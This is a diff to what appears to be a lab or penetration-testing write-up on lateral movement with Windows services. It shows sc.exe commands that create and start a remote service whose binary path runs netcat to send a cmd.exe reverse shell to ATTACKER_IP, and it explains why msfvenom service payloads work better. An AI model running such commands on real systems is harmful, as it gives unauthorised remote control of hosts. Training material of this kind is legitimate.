@@ -135,14 +135,16 @@ iis
 
 **Additional notes**
 
-Note that it will not work if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
+Note that it will not work expected if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
 
 {% code title="jmp.test.com (admin)" overflow="wrap" %}
 ```powershell
-C:\Windows/system32> sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto
+C:\Windows/system32> sc.exe \\iis.test.com create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto
 
-C:\Windows/system32> sc.exe \\TARGET start <servicename>
+C:\Windows/system32> sc.exe \\iis.test.com start <servicename>
 ```
 {% endcode %}
+
+More accurately, this action will actually establish a remote shell on the target `iis.test.com` server, but will be terminated shortly after.
 
 This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.
